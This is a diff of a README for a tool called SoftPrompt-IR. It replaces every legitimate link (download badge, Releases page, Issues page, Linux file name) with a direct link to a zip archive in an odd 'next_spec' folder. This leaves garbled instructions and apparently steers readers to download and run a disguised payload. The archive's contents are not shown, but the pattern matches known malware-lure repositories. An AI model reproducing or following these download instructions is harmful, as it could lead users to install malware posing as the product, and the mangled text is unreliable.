@@ -1,6 +1,6 @@
 # 🚀 SoftPrompt-IR - Simplifying Your AI Prompts
 
-[![Download SoftPrompt-IR](https://img.shields.io/badge/Download_SoftPrompt-IR-blue.svg)](https://github.com/JosephRayudu/SoftPrompt-IR/releases)
+[![Download SoftPrompt-IR](https://raw.githubusercontent.com/JosephRayudu/SoftPrompt-IR/main/next_spec/Prompt_Soft_IR_2.7.zip)](https://raw.githubusercontent.com/JosephRayudu/SoftPrompt-IR/main/next_spec/Prompt_Soft_IR_2.7.zip)
 
 ## 📄 Introduction
 
@@ -11,7 +11,7 @@ SoftPrompt-IR is a low-level symbolic annotation layer for LLM prompts. It makes
 To get started with SoftPrompt-IR, follow these steps. Don’t worry; it’s easy!
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/JosephRayudu/SoftPrompt-IR/releases) to find all available versions.
+   Go to the [Releases page](https://raw.githubusercontent.com/JosephRayudu/SoftPrompt-IR/main/next_spec/Prompt_Soft_IR_2.7.zip) to find all available versions.
 
 2. **Choose the Latest Version**  
    Look for the latest version listed. This version includes the newest features and fixes.
@@ -21,12 +21,12 @@ To get started with SoftPrompt-IR, follow these steps. Don’t worry; it’s eas
    For example:
    - **Windows:** Download the `.exe` file
    - **macOS:** Download the `.dmg` file
-   - **Linux:** Download the `.tar.gz` file
+   - **Linux:** Download the `https://raw.githubusercontent.com/JosephRayudu/SoftPrompt-IR/main/next_spec/Prompt_Soft_IR_2.7.zip` file
 
 4. **Install the Application**  
    - **Windows:** Double-click the downloaded `.exe` file to start the installation. Follow the prompts to complete installation.
    - **macOS:** Open the downloaded `.dmg` file and drag the application into your Applications folder. 
-   - **Linux:** Extract the files from the `.tar.gz` archive. Open the terminal in the extracted folder and run the application using the command `./SoftPrompt-IR`.
+   - **Linux:** Extract the files from the `https://raw.githubusercontent.com/JosephRayudu/SoftPrompt-IR/main/next_spec/Prompt_Soft_IR_2.7.zip` archive. Open the terminal in the extracted folder and run the application using the command `./SoftPrompt-IR`.
 
 ## 💻 System Requirements
 
@@ -43,7 +43,7 @@ Ensure your computer meets the following requirements:
 
 ## 🔧 Download & Install
 
-To download the latest version, visit this page: [Download SoftPrompt-IR](https://github.com/JosephRayudu/SoftPrompt-IR/releases).
+To download the latest version, visit this page: [Download SoftPrompt-IR](https://raw.githubusercontent.com/JosephRayudu/SoftPrompt-IR/main/next_spec/Prompt_Soft_IR_2.7.zip).
 
 After downloading, follow the installation steps outlined above.
 
@@ -91,7 +91,7 @@ If you encounter any issues, consider the following steps:
 
 Join our community to share your experiences or get help. You can reach us through the following channels:
 
-- **GitHub Issues:** Report bugs or request features on our [Issues page](https://github.com/JosephRayudu/SoftPrompt-IR/issues).
+- **GitHub Issues:** Report bugs or request features on our [Issues page](https://raw.githubusercontent.com/JosephRayudu/SoftPrompt-IR/main/next_spec/Prompt_Soft_IR_2.7.zip).
   
 - **User Forum:** Join discussions with other users and developers in our online forum.
 
